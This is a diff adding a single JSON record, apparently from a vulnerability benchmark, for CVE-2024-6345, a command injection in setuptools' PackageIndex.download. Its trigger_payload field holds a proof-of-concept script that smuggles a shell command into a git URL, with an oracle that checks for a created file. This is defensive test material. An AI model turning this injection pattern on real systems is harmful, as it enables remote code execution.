@@ -1,0 +1,15 @@
+{
+  "file_id": "369_setuptools_huntr_d6362117-ad57-4e83-951f-b8141c6e7ca5",
+  "numeric_id": "369",
+  "library_hint": "setuptools",
+  "source": "huntr",
+  "title": "Remote code execution via code injection in download functions of setuptools package_index module",
+  "cve": "CVE-2024-6345",
+  "cwe": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+  "library": "pypa/setuptools",
+  "affected_version": ">= 65.5, < 70.0",
+  "vulnerable_function": "PackageIndex.download",
+  "triggerability": "indirect",
+  "trigger_payload": "from setuptools.package_index import (PackageIndex, parse_requirement_arg, URL_SCHEME)\npackage_index = PackageIndex()\nurl = \"git://example.net/package-a.git; echo 'hello' > good@main#egg=Package-A\" # P\nprint(f\"Fetching url: \\\"{url}\\\"\")\nprint(\"Observe the new file created (named 'good@main') in the current directory.\\n\")\npackage_index.download(url, '/tmp/testing')",
+  "oracle": "a new file named 'good@main' is created in the current directory"
+}
